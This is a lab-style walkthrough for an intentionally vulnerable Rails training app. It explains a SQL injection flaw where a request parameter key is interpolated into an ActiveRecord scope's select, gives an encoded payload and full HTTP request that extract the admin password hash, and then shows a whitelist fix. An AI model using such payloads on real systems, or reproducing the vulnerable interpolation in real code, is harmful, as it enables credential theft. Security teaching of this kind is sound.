# Description

ActiveRecord provides a useful tool for it's Models called a scope. In the words of the documentation:

>"Scoping allows you to specify commonly-used queries which can be referenced as  method calls on the association objects or models."

This means that we can call a scope as a method and that the scope can be used for common queries such as where and join. Developers must be careful not to interpolate or concatenate user input into these scope calls as this can lead to SQL Injection. This is a common mistake made and can have serious consequences.

# Bug

Within app/models/analytics.rb:

```ruby
class Analytics < ActiveRecord::Base
  attr_accessible :ip_address, :referrer, :user_agent

  scope :hits_by_ip, ->(ip,col="*") { select("#{col}").where(:ip_address => ip).order("id DESC")}

  def self.count_by_col(col)
    calculate(:count, col)
  end
```

Additionally, within app/controllers/admin_controller.rb:

```ruby
def analytics
  if params[:field].nil?
    fields = "*"
  else
    fields = params[:field].map {|k,v| k }.join(",")
  end

  if params[:ip]
    @analytics = Analytics.hits_by_ip(params[:ip], fields)
  else
    @analytics = Analytics.all
  end
  render "layouts/admin/_analytics"
end
```

Within the controller we call the method hits_by_ip. This method is actually a scope as highlighted (above) in the Analytics model. The field object, defined within the controller, represents user-input that is intended to control the column returned by the SQL query. The field object represents the HTTP Request's parameter key. So this means we can control at least a portion of the query. Due to the fact that this input is used as an interpolated value within the query string, we have control over a larger portion of the query.

# Solution

### SQL Injection - ATTACK

You will need to use an intercepting proxy or otherwise modify the request prior to it being received by the application. Your goal will be to obtain sensitive values from the database - specifically the md5 hashed password of our administrative account.

To get started, login as a **non**-admin user (otherwise, whats the point?). Now, navigate to the analytics page:

[http://localhost:3000/admin/1/analytics](http://localhost:3000/admin/1/analytics)

Type `127.0.0.1` or `::1` into the `Search by IP` field. Click the `User Agent` box, as well.

Click enter and initiate the request. Catch and modify the request in your intercepting proxy. Change...

`&field%5Buser_agent%5D=`

to

`field%5B%28select+group_concat%28password%29+from+users+where+admin%3D%27t%27%29%5D`

When decoded, the string shown above is `field[(select+group_concat(password)+from+users+where+admin='t')]`. The `(select+group_concat(password)+from+users+where+admin='t')` portion will be included in the existing query `{ select("#{col}").where(ip_address: ip).order("id DESC")}`. This creates the following query:

`SELECT (select group_concat(password) from users) FROM "analytics" WHERE "analytics"."ip_address" = ? ORDER BY id DESC  [["ip_address", "127.0.0.1"]]`

So we've joined the administrative password hash with the ip addresses being returned in the query.

The following is the full request:

```
GET /admin/1/analytics?ip=127.0.0.1&field%5B%28select+group_concat%28password%29+from+users+where+admin%3D%27t%27%29%5D HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/admin/1/analytics
Cookie: _railsgoat_session=[REDACTED]
Connection: close
Upgrade-Insecure-Requests: 1
```

### SQL Injection - SOLUTION

To resolve this issue, do not interpolate user-provided input into SQL queries. However, it is always a good idea to create a whitelist of acceptable values when writing any code that is intended to be powerful and very flexible but that also leverages user-input to make these potentially security-impacting decisions. Within the Analytics model, we have a method called `parse_field`:

```ruby
def self.parse_field(field)
 valid_fields = ["ip_address", "referrer", "user_agent"]
 
 if valid_fields.include?(field)
   field
 else
   "1"
 end
end
```
When used properly, this method prevents anything that does not match those items in the valid_fields array from reaching the SQL query. For example, within the admin controller we can prevent anything that does not match that white-list from inclusion into the query by doing the following:

```ruby
def analytics
  if params[:field].nil?
    fields = "*"
  else
   fields = params[:field].map {|k,v| Analytics.parse_field(k) }.join(",")
  end

  if params[:ip]
    @analytics = Analytics.hits_by_ip(params[:ip], fields)
  else
    @analytics = Analytics.all
  end
  render "layouts/admin/_analytics"
end
```

Effectively, we've changed any malicious data provided by the user into the number '1' by leveraging the above code.
# Hint
Administrative analytics functionality need further security analysis. Now might be a good time to test for SQLi.